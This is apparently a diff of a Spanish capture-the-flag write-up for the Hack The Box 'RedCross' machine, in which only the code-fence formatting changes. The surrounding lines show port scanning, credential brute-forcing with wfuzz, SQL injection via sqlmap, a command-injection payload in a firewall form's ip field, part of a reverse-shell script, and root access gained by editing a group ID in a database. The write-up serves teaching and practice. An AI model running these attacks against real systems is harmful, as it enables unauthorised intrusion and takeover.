@@ -27,7 +27,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- -n --open -v 10.10.10.113
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 16:47 CST
 Initiating Ping Scan at 19:04
@@ -67,7 +67,7 @@ Como pudimos ver con `nmap`, el escaneo demoraba mucho e incrementaba el tiempo 
 
 Por el momento, tomemos como referencia los resultados, los 3 primeros puertos descubiertos, y continuemos con el doblecheck usando `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.113
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-18 01:15:51 GMT
@@ -89,7 +89,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV) y le sumamos un timeout a los scripts NSE de 10:
 
-```text
+``` text
 root@laptop:~# nmap -sC -sV -p22,80,443 -n -v 10.10.10.113 --script-timeout 10
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 18:31 CDT
 NSE: Loaded 148 scripts for scanning.
@@ -170,7 +170,7 @@ Como podemos ver, tenemos 2 servicios HTTP (TCP/80) y HTTPS (TCP/443) haciendo r
 
 Comenzamos por explorar el servicio web sobre el puerto TCP/80:
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http 10.10.10.113
 HTTP/1.1 301 Moved Permanently
 Connection: Keep-Alive
@@ -196,7 +196,7 @@ Lo primero que recibimos es un código 301 que nos redirige hacia `intra.redcros
 
 Hagamos la prueba sobre intra.redcross.htb:
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http 10.10.10.113 Host:intra.redcross.htb
 HTTP/1.1 301 Moved Permanently
 Connection: Keep-Alive
@@ -222,7 +222,7 @@ Observamos que al ingresar correctamente el vhost, tenemos una redirección haci
 
 Sigamos esta redirección:
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http --verify no https://10.10.10.113 Host:intra.redcross.htb
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -242,7 +242,7 @@ Set-Cookie: PHPSESSID=aa8a92c5mkbstk7b3t01qt37o5; path=/
 
 Tenemos ahora un *302*, un `location` de `/?page=login` y un portal de ingreso para empleados "intranet". Hamos un request en esta pagina:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ http --verify no https://10.10.10.113/?page=login Host:intra.redcross.htb
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -267,7 +267,7 @@ Agregaremos el fqdn 'intra.redcross.htb' en nuestro archivo /etc/hosts.
 
 Podemos ver que tenemos un form hacia `/pages/actions.php` que recibe el user, pass y action. Mandemos una prueba via POST con las credenciales tradicionales de admin/admin:
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=admin pass=admin submit=Login action=login
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -287,7 +287,7 @@ Wrong data!
 
 Vemos que nos arroja el mensaje de error de `Wrong data!`, esto lo podemos meter a `wfuzz` para realizar un ataque de fuerza bruta a las credenciales de acceso:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ wfuzz -c --hh 11 -z file,/home/xbytemx/git/SecLists/Usernames/top-usernames-shortlist.txt -z file,/home/xbytemx/git/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt -d 'user=FUZZ&pass=FUZ2Z&submit=Login&action=login' https://intra.redcross.htb/pages/actions.php
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -317,7 +317,7 @@ Como podemos ver después de un par de intentos (39), el servidor empieza a rech
 
 Reduciendo la prueba a valores idénticos (mismo nombre y contraseña), logre adivinar una cuenta para acceder:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ wfuzz -c --hh 11 -z file,/home/xbytemx/git/SecLists/Usernames/top-usernames-shortlist.txt -d 'user=FUZZ&pass=FUZZ&submit=Login&action=login' https://intra.redcross.htb/pages/actions.php
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -351,7 +351,7 @@ Como recodaremos, al realizar una petición directamente al servidor, nos mando 
 
 Probemos con vhostscan:
 
-```
+``` text
 (VHostScan-loWTcTIQ) xbytemx@laptop:~/git/VHostScan$ VHostScan -t intra.redcross.htb -b redcross.htb -p 443 --ssl
 +-+-+-+-+-+-+-+-+-+  v. 1.21
 |V|H|o|s|t|S|c|a|n|  Developed by @codingo_ & @__timk
@@ -387,7 +387,7 @@ Probemos con vhostscan:
 
 Hemos encontrado otro vhosts, en este caso se trata de `admin.redcross.htb`, el cual agregamos tambien a nuestro archivo `/etc/hosts`:
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb"
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -413,7 +413,7 @@ Necesitamos nuevamente algunas credenciales, pero vemos una estructura muy famil
 
 Ahora que hemos identificado unas credenciales para intra, validemos el acceso:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=guest pass=guest action=login action=login
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -440,7 +440,7 @@ Siguiendo el redirect que se genera después, tendremos una pantalla como la sig
 
 ![intra login](/img/htb-redcross/http-intra-login.png)
 
-```
+``` text
 xbytemx@laptop:~$ http --verify no https://intra.redcross.htb/?page=app "Cookie: PHPSESSID=le7n8htqei4pg268v1bm1vqtq1;LANG=EN_US;SINCE=1552972200;LIMIT=10;DOMAIN=intra;"
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -462,7 +462,7 @@ Vary: Accept-Encoding
 
 Después de explorar un poco el home (app), me di cuenta de la exposición de algunas variables, por lo que intente un sqli con algunos parámetros de evasión usando `sqlmap`:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent
         ___
        __H__
@@ -554,7 +554,7 @@ back-end DBMS: MySQL >= 5.0
 
 Como pudimos observar, es posible hacer una sqli dentro del servidor, por lo que omitiré la información de estatus centrándome en las salidas de sqlmap:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent --dbs
 
 [23:19:17] [INFO] the back-end DBMS is MySQL
@@ -649,7 +649,7 @@ También al leer la descripción del problema que reportan los usuarios detectar
 
 Primero obtengamos una cookie de intra:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=guest pass=guest submit=Login action=login
 
 <omitiendo>
@@ -659,7 +659,7 @@ PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DO
 
 Ahora cambiemos donde diga intra por admin y preparemos una petición GET:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb" "Cookie:PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DOMAIN=admin;"
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -683,7 +683,7 @@ El portal que tenemos y debemos ver es el siguiente:
 
 Visitemos el cpanel de admin:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb/?page=cpanel" "Cookie:PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DOMAIN=admin;"
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -703,7 +703,7 @@ Vary: Accept-Encoding
 
 Tenemos una administración de usuarios y de reglas de firewall. Comencemos por conocer **User Management** (users):
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http --verify=no "https://admin.redcross.htb/?page=users" "Cookie:PHPSESSID=oiuslv12i7j2urs7u86etj3bq6; LANG=EN_US; SINCE=1553146196; LIMIT=10; DOMAIN=admin;" HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
 Connection: Keep-Alive
@@ -724,7 +724,7 @@ Vary: Accept-Encoding
 
 Como podemos observar, se trata de una pagina donde crearemos usuarios virtuales con permisos limitados. Crearemos al usuario miau:
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http --verify=no -f POST "https://admin.redcross.htb/pages/actions.php" "Cookie:PHPSESSID=oiuslv12i7j2urs7u86etj3bq6; LANG=EN_US; SINCE=1553146196; LIMIT=10; DOMAIN=admin;" username=miau action=adduser
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -745,7 +745,7 @@ Provide this credentials to the user:<br><br><b>miau : E8z6e6iL</b><br><br><a hr
 
 Estas credenciales nos servirán para poder ingresar por SSH:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ ssh miau@admin.redcross.htb
 The authenticity of host 'admin.redcross.htb (10.10.10.113)' can't be established.
 ECDSA key fingerprint is SHA256:yd04sZox5Ub78YD9IP7Yrslhv2TgP7lcFNiOBpZjCfk.
@@ -770,7 +770,7 @@ Pronto nos daremos cuenta de lo limitada que es esta shell y que no cuenta con m
 
 Veamos ahora que podemos hacer desde **Network Access** (firewall):
 
-```html
+``` html
 xbytemx@laptop:~/htb/redcross$ http --verify no https://admin.redcross.htb/?page=firewall Cookie:"PHPSESSID=79cdhgjto42ab714987f6258c1; LANG=EN_US; SINCE=1555294885; LIMIT=10; DOMAIN=admin;"HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
 Connection: Keep-Alive
@@ -790,7 +790,7 @@ Vary: Accept-Encoding
 Como podemos ver, contamos con varias reglas para permitir o denegar ciertas direcciones IP. Aquí al igual que con users, probé algunas combinaciones clásicas para un command injection, resultando esta pagina vulnerable:
 
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ http --verify=no -f POST https://admin.redcross.htb/pages/actions.php Cookie:"PHPSESSID=79cdhgjto42ab714987f6258c1; LANG=EN_US; SINCE=1555294885; LIMIT=10; DOMAIN=admin;" ip='1.1.1.1;ping -c1 10.10.14.84' action='Allow IP'
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -828,7 +828,7 @@ PING 10.10.14.84 (10.10.14.84) 56(84) bytes of data.
 
 Habiendo identificado que podemos realizar un command injection desde el parametro **ip**, prepare el siguiente script de python para generar una reverse shell cada que necesite conectarme:
 
-```python
+``` python
 import requests,netifaces
 
 urlIntraBase='https://intra.redcross.htb'
@@ -857,7 +857,7 @@ print res.text
 
 Ahora que hemos conseguido acceso al servidor, comencemos por enumerar el directorio de */var/www/html/*:
 
-```
+``` text
 xbytemx@laptop:~/htb/redcross$ ncat -nvlp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -932,7 +932,7 @@ Hemos encontrado unas credenciales de mysql, misma que accedimos por el SQLi.
 
 Después de continuar analizando las aplicaciones, encontraremos que hay otra conexión a otra base de datos, una a postgresql que usaba la aplicación de *admin* para el control de red:
 
-```php
+``` php
 www-data@redcross:/var/www/html$ cat admin/pages/actions.php
 cat admin/pages/actions.php
 <?php
@@ -1071,7 +1071,7 @@ if($action==='del'){
 
 Resumiendo con grep:
 
-```
+``` text
 www-data@redcross:/var/www/html/admin/pages$ cat * | grep pg_connect
 cat * | grep pg_connect
 	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
@@ -1094,7 +1094,7 @@ Convirtiendo a tabla:
 
 Validemos que tenemos dentro de esta base de datos, comenzando por la db con el nombre de la maquina:
 
-```
+``` text
 www-data@redcross:/var/www/html/admin/pages$ psql -h 127.0.0.1 -d redcross -U www -W
 <dmin/pages$ psql -h 127.0.0.1 -d redcross -U www -W
 Password for user www: aXwrtUO9_aa&
@@ -1117,7 +1117,7 @@ Password for user www: aXwrtUO9_aa&
 
 Parece que desde aquí no podremos hacer mucho con www. Cambiemos de db y owner:
 
-```
+``` text
 \c unix unixusrmgr
 Password for user unixusrmgr: dheu%7wjx8B&
 
@@ -1160,7 +1160,7 @@ You are now connected to database "unix" as user "unixusrmgr".
 
 Parece que en la tabla passwd_table con las columnas gid, username, passwd y homedir son las únicas que podemos editar.
 
-```
+``` text
 \d passwd_table
                              Table "public.passwd_table"
   Column  |          Type          |                    Modifiers
@@ -1194,7 +1194,7 @@ Aparece nuestro usuario `miau`, que como recordamos pertenece a un ambiente enja
 
 En el ambiente enjaulado agrega a todos los usuarios nuevos al grupo limitado con *GID* 1001, el cual nos impidió realizar algunas tareas, pero ahora que tenemos acceso a la DB, podemos cambiar esa propiedad. Cambiemos esta propiedad a 0:
 
-```
+``` text
 update passwd_table set gid=0 where username='miau';
 select * from passwd_table;
  username |               passwd               | uid  | gid  | gecos |    homedir     |   shell
@@ -1206,7 +1206,7 @@ select * from passwd_table;
 
 Ahora hagamos un upgrade de nuestra shell y accedamos como miau:
 
-```
+``` text
 www-data@redcross:/var/www/html/admin/pages$ python -c 'import pty; pty.spawn("/bin/bash")'
 <s$ python -c 'import pty; pty.spawn("/bin/bash")'
 www-data@redcross:/var/www/html/admin/pages$ su - miau
@@ -1218,7 +1218,7 @@ miau@redcross:~$
 
 Pero ser del grupo root no nos hace root.
 
-```
+``` text
 miau@redcross:~$ cat /root/root.txt /home/penelope/user.txt
 cat /root/root.txt /home/penelope/user.txt
 cat: /root/root.txt: Permission denied
@@ -1246,7 +1246,7 @@ Recordemos que como solo podemos editar el grupo, aunque lo cambiemos a root, no
 
 Pero si hay una manera en la que un usuario puede adquirir todos los poderes de otro, esto es mediante SUDO. Ahora que somos del grupo chido, veamos que hay en sudoers:
 
-```
+``` text
 miau@redcross:~$ cat /etc/sudoers | grep -E 'ALL$'
 cat /etc/sudoers | grep -E 'ALL$'
 root	ALL=(ALL:ALL) ALL
@@ -1255,7 +1255,7 @@ root	ALL=(ALL:ALL) ALL
 
 Esto significa que cualquier que pertenezca al grupo sudo, [podrá](https://www.hostinger.com/tutorials/sudo-and-the-sudoers-file/) subir a root. Ahora solo falta verificar cual es el grupo de sudo:
 
-```
+``` text
 miau@redcross:~$ cat /etc/group | grep sudo
 cat /etc/group | grep sudo
 sudo:x:27:
@@ -1263,7 +1263,7 @@ sudo:x:27:
 
 Ahora si, cambiemos el grupo en la shell conectada a postgre:
 
-```
+``` text
 update passwd_table set gid=27 where username='miau';
 select * from passwd_table;
  username |               passwd               | uid  | gid  | gecos |    homedir     |   shell
@@ -1275,7 +1275,7 @@ select * from passwd_table;
 
 Ahora que nuestro usuario `miau` pertenece al grupo sudo, elevemos a nuestro usuario:
 
-```
+``` text
 miau@redcross:~$ sudo -s
 sudo -s
 
@@ -1295,7 +1295,7 @@ root@redcross:/var/jail/home#
 
 Finalmente, como root desde miau, podemos tomar las flags:
 
-```
+``` text
 root@redcross:/var/jail/home# cat /root/root.txt /home/penelope/user.txt
 ```
 
